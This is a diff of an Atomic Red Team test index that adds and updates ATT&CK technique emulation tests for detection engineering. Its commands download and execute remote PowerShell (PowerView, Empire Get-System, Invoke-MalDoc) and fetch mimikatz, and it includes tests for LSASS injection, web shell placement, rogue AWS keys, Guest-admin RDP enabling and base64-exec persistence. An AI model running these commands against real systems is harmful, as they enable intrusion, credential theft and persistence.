+        command: 'Mount-DiskImage -ImagePath "#{path_of_iso}"
+
+'
+        cleanup_command: 'Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
+
+'
+        name: powershell
+    - name: Mount an ISO image and run executable from the ISO
+      auto_generated_guid: 42f22b00-0242-4afc-a61b-0da05041f9cc
+      description: "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web
+        and run hello.exe executable from the ISO. \nUpon successful execution, powershell
+        will download the .iso from the Atomic Red Team repo, mount the image, and
+        run the executable from the ISO image that will open command prompt echoing
+        \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620
+        Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,
+        \ "
+      supported_platforms:
+      - windows
+      input_arguments:
+        path_of_iso:
+          description: Path to ISO file
+          type: path
+          default: PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})
+
+'
+        prereq_command: 'if (Test-Path #{path_of_iso}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{path_of_iso}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile "#{path_of_iso}"
+      executor:
+        command: |
+          $keep = Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly
+          $driveLetter = ($keep | Get-Volume).DriveLetter
+          invoke-item "$($driveLetter):\hello.exe"
+        cleanup_command: |
+          Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
+          Stop-process -name "hello" -Force -ErrorAction ignore
+        name: powershell
   T1036.004:
     technique:
       external_references:
@@ -27406,7 +27753,33 @@ defense-evasion:
       x_mitre_contributors:
       - Yossi Weizman, Azure Defender Research Team
       - Vishwas Manral, McAfee
-    atomic_tests: []
+      identifier: T1036.005
+    atomic_tests:
+    - name: Execute a process from a directory masquerading as the current parent
+        directory.
+      auto_generated_guid: 812c3ab8-94b0-4698-a9bf-9420af23ce24
+      description: 'Create and execute a process from a directory masquerading as
+        the current parent directory (`...` instead of normal `..`)
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        test_message:
+          description: Test message to echo out to the screen
+          type: String
+          default: Hello from the Atomic Red Team test T1036.005#1
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          mkdir $HOME/...
+          cp $(which sh) $HOME/...
+          $HOME/.../sh -c "echo #{test_message}"
+        cleanup_command: |
+          rm -f $HOME/.../sh
+          rmdir $HOME/.../
   T1556:
     technique:
       external_references:
@@ -30570,7 +30943,8 @@ defense-evasion:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
@@ -30704,7 +31078,8 @@ defense-evasion:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
     - name: Remote Process Injection in LSASS via mimikatz
@@ -30740,6 +31115,7 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
@@ -30752,6 +31128,7 @@ defense-evasion:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
           New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
@@ -34247,30 +34624,26 @@ defense-evasion:
     atomic_tests:
     - name: WINWORD Remote Template Injection
       auto_generated_guid: 1489e08a-82c7-44ee-b769-51b72d03521d
-      description: 'Open a .docx file that loads a remote .dotm macro enabled template.
-        Executes the code specified within the .dotm template.Requires download of
-        WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  Opens
-        Calculator.exe when test sucessfully executed, while AV turned off.
-
-'
+      description: "Open a .docx file that loads a remote .dotm macro enabled template
+        from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm
+        \nExecutes the code specified within the .dotm template.\nRequires download
+        of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.
+        \ \nDefault docs file opens Calculator.exe when test sucessfully executed,
+        while AV turned off.\n"
       supported_platforms:
       - windows
       input_arguments:
-        docx file:
+        docx_file:
           description: Location of the test docx file on the local filesystem.
           type: Path
           default: PathToAtomicsFolder\T1221\src\Calculator.docx
-        dotm template:
-          description: Location of the test dotm template on the remote server.
-          type: Path
-          default: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm
       dependency_executor_name: powershell
       dependencies:
       - description: ''
         prereq_command: ''
         get_prereq_command: ''
       executor:
-        command: 'start PathToAtomicsFolder\T1221\src\Calculator.docx
+        command: 'start #{docx_file}
 
 '
         name: command_prompt
@@ -34801,8 +35174,9 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
-          -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
         name: powershell
         elevation_required: true
     - name: "`SeDebugPrivilege` token duplication"
@@ -34813,8 +35187,9 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
-          -UseBasicParsing); Get-System -Technique Token -Verbose
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
         name: powershell
         elevation_required: true
   T1205:
@@ -36382,6 +36757,39 @@ persistence:
 
 '
         name: powershell
+    - name: AWS - Create a group and add a user to that group
+      auto_generated_guid: 8822c3b0-d9f9-4daf-a043-49f110a31122
+      description: 'Adversaries create AWS group, add users to specific to that group
+        to elevate their privilieges to gain more accesss
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        username:
+          description: Name of the AWS group to create
+          type: String
+          default: atomicredteam
+      dependencies:
+      - description: 'Check if the user exists, we can only add a user to a group
+          if the user exists.
+
+'
+        prereq_command: 'aws iam list-users | grep #{username}
+
+'
+        get_prereq_command: 'echo Please run atomic test T1136.003, before running
+          this atomic test
+
+'
+      executor:
+        command: |
+          aws iam create-group --group-name #{username}
+          aws iam add-user-to-group --user-name #{username} --group-name #{username}
+        cleanup_command: |
+          aws iam remove-user-from-group --user-name #{username} --group-name #{username}
+          aws iam delete-group --group-name #{username}
+        name: sh
   T1547.014:
     technique:
       external_references:
@@ -36635,7 +37043,42 @@ persistence:
       x_mitre_platforms:
       - IaaS
       - Azure AD
-    atomic_tests: []
+      identifier: T1098.001
+    atomic_tests:
+    - name: AWS - Create Access Key and Secret Key
+      auto_generated_guid: 8822c3b0-d9f9-4daf-a043-491160a31122
+      description: 'Adversaries create their own new access and secret keys to programatically
+        interact with AWS environment, which is already compromised
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        username:
+          description: Create new AWS access and secret keys for the user
+          type: String
+          default: atomicredteam
+      dependencies:
+      - description: 'Check if the user exists.
+
+'
+        prereq_command: 'aws iam list-users | grep #{username}
+
+'
+        get_prereq_command: 'echo Please run atomic test T1136.003, before running
+          this atomic
+
+'
+      executor:
+        command: |
+          aws iam create-access-key --user-name #{username} > $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds
+          cd $PathToAtomicsFolder/T1098.001/bin/
+          ./aws_secret.sh
+        cleanup_command: |
+          access_key=`cat $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds| jq -r '.AccessKey.AccessKeyId'`
+          aws iam delete-access-key --access-key-id $access_key --user-name #{username}
+          rm $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds
+        name: sh
   T1546.009:
     technique:
       external_references:
@@ -36802,7 +37245,8 @@ persistence:
         computer starts up various applications and may in fact drive you crazy. A
         reliable way to make the message box appear and verify the \nAppInit Dlls
         are loading is to start the notepad application. Be sure to run the cleanup
-        commands afterwards so you don't keep getting message boxes showing up\n"
+        commands afterwards so you don't keep getting message boxes showing up.\n\nNote:
+        If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -37435,7 +37879,7 @@ persistence:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
           bitsadmin.exe /resume #{bits_job_name}
           timeout 5
           bitsadmin.exe /complete #{bits_job_name}
@@ -38205,7 +38649,43 @@ persistence:
       - Office 365
       - IaaS
       - Google Workspace
-    atomic_tests: []
+      identifier: T1136.003
+    atomic_tests:
+    - name: AWS - Create a new IAM user
+      auto_generated_guid: 8d1c2368-b503-40c9-9057-8e42f21c58ad
+      description: 'Creates a new IAM user in AWS. Upon successful creation, a new
+        user will be created. Adversaries create new IAM users so that their malicious
+        activity do not interupt the normal functions of the compromised users and
+        can remain undetected for a long time
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        username:
+          description: Username of the IAM user to create in AWS
+          type: String
+          default: atomicredteam
+      dependencies:
+      - description: 'Check if ~/.aws/credentials file has a default stanza is configured
+
+'
+        prereq_command: 'cat ~/.aws/credentials | grep "default"
+
+'
+        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
+          defult profile using: aws configure
+
+'
+      executor:
+        command: 'aws iam create-user --user-name #{username}
+
+'
+        cleanup_command: 'aws iam delete-user --user-name #{username}
+
+'
+        name: sh
+        elevation_required: false
   T1078.004:
     technique:
       id: attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65
@@ -39064,9 +39544,9 @@ persistence:
     atomic_tests:
     - name: Enable Guest account with RDP capability and admin priviliges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
-      description: After execution the Default Guest account will be enabled (Active)
-        and added to Administrators and Remote Desktop Users Group, and desktop will
-        allow multiple RDP connections
+      description: |
+        After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
+        and desktop will allow multiple RDP connections.
       supported_platforms:
       - windows
       input_arguments:
@@ -39078,6 +39558,10 @@ persistence:
           description: Specify the guest password
           type: String
           default: Password123!
+        remove_rdp_access_during_cleanup:
+          description: Set to 1 if you want the cleanup to remove RDP access to machine
+          type: Integer
+          default: 0
       executor:
         command: |-
           net user #{guest_user} /active:yes
@@ -39090,8 +39574,9 @@ persistence:
           net user #{guest_user} /active:no >nul 2>&1
           net localgroup administrators #{guest_user} /delete >nul 2>&1
           net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
+          if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
+          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
+          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
         name: command_prompt
         elevation_required: true
   T1136.002:
@@ -41670,11 +42155,11 @@ persistence:
       - windows
       executor:
         command: |
-          reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /t REG_DWORD /d 4
-          if not exist  %APPDATA%\Microsoft\Outlook ( md %APPDATA%\Microsoft\Outlook\ )
+          reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /t REG_DWORD /d 1 /f
+          mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
           echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
         cleanup_command: |
-          reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /f
+          reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /f
           del %APPDATA%\Microsoft\Outlook\VbaProject.OTM
         name: command_prompt
   T1137.001:
@@ -43942,7 +44427,8 @@ persistence:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -44860,6 +45346,48 @@ persistence:
           rm -rf #{systemd_service_path}/#{systemd_service_file}
           systemctl daemon-reload
         name: bash
+    - name: Create Systemd Service file,  Enable the service , Modify and Reload the
+        service.
+      auto_generated_guid: c35ac4a8-19de-43af-b9f8-755da7e89c89
+      description: "This test creates a systemd service unit file and enables it to
+        autostart on boot. Once service is created and enabled, it also modifies this
+        same service file showcasing both Creation and Modification of system process.
+        \n"
+      supported_platforms:
+      - linux
+      dependencies:
+      - description: 'System must be Ubuntu ,Kali OR CentOS.
+
+'
+        prereq_command: 'if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat
+          /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i
+          ''ID="centos"'') ]; then exit /b 0; else exit /b 1; fi;
+
+'
+        get_prereq_command: 'echo Please run from Ubuntu ,Kali OR CentOS.
+
+'
+      executor:
+        name: bash
+        elevation_required: true
+        command: "cat > /etc/init.d/T1543.002 << EOF\n#!/bin/bash\n### BEGIN INIT
+          INFO\n# Provides : Atomic Test T1543.002\n# Required-Start: $all\n# Required-Stop
+          : \n# Default-Start: 2 3 4 5\n# Default-Stop: \n# Short Description: Atomic
+          Test for Systemd Service Creation\n### END INIT INFO\npython3 -c \"import
+          os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"\nEOF\n\nchmod
+          +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu)
+          ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002
+          defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then
+          chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali
+          OR centos\" ; fi ;\nsystemctl enable T1543.002\nsystemctl start T1543.002\n\necho
+          \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\"
+          | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl
+          restart T1543.002\n"
+        cleanup_command: |
+          systemctl stop T1543.002
+          systemctl disable T1543.002
+          rm -rf /etc/init.d/T1543.002
+          systemctl daemon-reload
   T1053.006:
     technique:
       id: attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21
@@ -45699,15 +46227,16 @@ persistence:
         get_prereq_command: |
           New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/test.jsp"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/tests.jsp"
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
       executor:
-        command: 'xcopy #{web_shells} #{web_shell_path}
+        command: 'xcopy /I /Y #{web_shells} #{web_shell_path}
 
 '
-        cleanup_command: 'del #{web_shell_path} /q >nul 2>&1
-
-'
+        cleanup_command: |
+          del #{web_shell_path}\b.jsp /q >nul 2>&1
+          del #{web_shell_path}\tests.jsp /q >nul 2>&1
+          del #{web_shell_path}\cmd.aspx /q >nul 2>&1
         name: command_prompt
   T1546.003:
     technique:
@@ -46877,6 +47406,21 @@ impact:
         cleanup_command: |
           $which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}
           rm #{encrypted_file_path}
+    - name: PureLocker Ransom Note
+      auto_generated_guid: 649349c7-9abf-493b-a7a2-b1aa4d141528
+      description: "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware
+        \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n"
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt
+
+'
+        cleanup_command: 'del %USERPROFILE%\Desktop\YOUR_FILES.txt >nul 2>&1
+
+'
   T1565:
     technique:
       external_references:
@@ -49663,10 +50207,9 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Find-LocalAdminAccess -Verbose
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
         name: powershell
     - name: Find local admins on all machines in domain (PowerView)
       auto_generated_guid: a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd
@@ -49678,10 +50221,9 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
         name: powershell
     - name: Find Local Admins via Group Policy (PowerView)
       auto_generated_guid: 64fdb43b-5259-467a-b000-1b02c00e510a
@@ -49697,9 +50239,9 @@ discovery:
           type: Path
           default: "$env:COMPUTERNAME"
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name}
-          -Verbose'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose"
         name: powershell
     - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
       auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
@@ -49759,10 +50301,9 @@ discovery:
         prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
 
 '
-        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
-          -OutFile #{adfind_path}
-
-'
+        get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
       executor:
         command: "#{adfind_path} -f (objectcategory=group)\n"
         name: command_prompt
@@ -50841,11 +51382,22 @@ discovery:
 '
       supported_platforms:
       - windows
-      executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Endpoint must be joined to domain
 
 '
+        prereq_command: 'if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: '"Join system to domain"
+
+'
+      executor:
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
         name: powershell
   T1040:
     technique:
@@ -52337,7 +52889,7 @@ discovery:
         vbscript:
           description: Path to sample script
           type: String
-          default: PathToAtomicsFolder\T1595.002\src\griffon_recon.vbs
+          default: PathToAtomicsFolder\T1082\src\griffon_recon.vbs
       executor:
         command: 'cscript #{vbscript}'
         name: powershell
@@ -52908,10 +53460,9 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
-          -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
         name: powershell
   T1007:
     technique:
@@ -58178,7 +58729,8 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
@@ -58239,7 +58791,8 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -58277,7 +58830,8 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -58314,7 +58868,8 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
         name: powershell
@@ -58448,7 +59003,8 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
     - name: Potentially Unwanted Applications (PUA)
@@ -59667,7 +60223,8 @@ execution:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -60076,7 +60633,41 @@ execution:
       x_mitre_remote_support: true
       x_mitre_contributors:
